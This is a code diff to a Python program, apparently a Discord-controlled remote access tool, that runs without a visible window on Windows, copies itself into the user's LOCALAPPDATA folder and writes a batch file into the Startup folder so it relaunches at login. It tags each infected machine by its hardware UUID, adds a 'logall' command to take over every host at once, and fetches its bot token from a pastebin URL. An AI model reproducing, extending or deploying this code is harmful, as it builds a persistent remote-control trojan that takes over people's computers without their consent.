@@ -11,6 +11,7 @@ import sys
 import os
 import re
 
+
 if getattr(sys, 'frozen', False):
     file_path = os.path.abspath(sys.executable)
     silent = 0x08000000
@@ -19,18 +20,25 @@ else:
     silent = 0
 
 file_name = file_path.split("\\")[-1]
-copium_ver = 1.24
-whoami = subprocess.run("whoami", shell=True, capture_output=True, encoding='cp858', creationflags=silent).stdout.rstrip()
+copium_ver = 1.25
+whoami = subprocess.check_output("wmic csproduct get uuid").decode().strip().replace("\r", "").split("\n")[1].strip()
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
 current_login = None
 
 
 def persistence():
     startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-    if file_name not in os.listdir(startup_folder_path):
-        subprocess.run(f"copy \"{file_path}\" \"{startup_folder_path}\"", shell=True, creationflags=silent)
-        subprocess.run(f"start \"\" \"{os.path.join(startup_folder_path, file_name)}\"", shell=True, creationflags=silent)
-        quit() if silent == 0 else sys.exit()
+    local_appdata_path = os.getenv('LOCALAPPDATA')
+
+    # if not executed in localappdata
+    if file_path != os.path.join(local_appdata_path, file_name):
+        # copy itself to localappdata
+        subprocess.run(f"copy \"{file_path}\" \"{local_appdata_path}", shell=True, creationflags=silent)
+
+    if f"{file_name}.bat" not in os.listdir(startup_folder_path):
+        # creates a batch to execute file inside localappdata
+        with open(os.path.join(startup_folder_path, file_name + ".bat"), "w") as f:
+            f.write(f"start {os.path.join(local_appdata_path, file_name)}")
 
 
 def log_command(ctx, args=None, error=False):
@@ -117,6 +125,14 @@ async def login_command(ctx, host):
     print(log_command(ctx, host))
 
 
+@client.hybrid_command(name="logall", with_app_command=True, description="logs into every account")
+async def logall_command(ctx):
+    global current_login
+    current_login = whoami
+    await ctx.reply(f"Logged into {current_login}", ephemeral=True)
+    print(log_command(ctx))
+
+
 @client.hybrid_command(name="version", with_app_command=True, description="tells the version running on the host")
 async def version_command(ctx):
     if current_login != whoami:
@@ -192,5 +208,4 @@ async def site_command(ctx, site):
 
 if __name__ == '__main__':
     persistence()
-    TOKEN = requests.get("some pastebin raw url").content.decode()
-    client.run(TOKEN, log_handler=None)
+    client.run(requests.get("some pastebin raw url").content.decode(), log_handler=None)
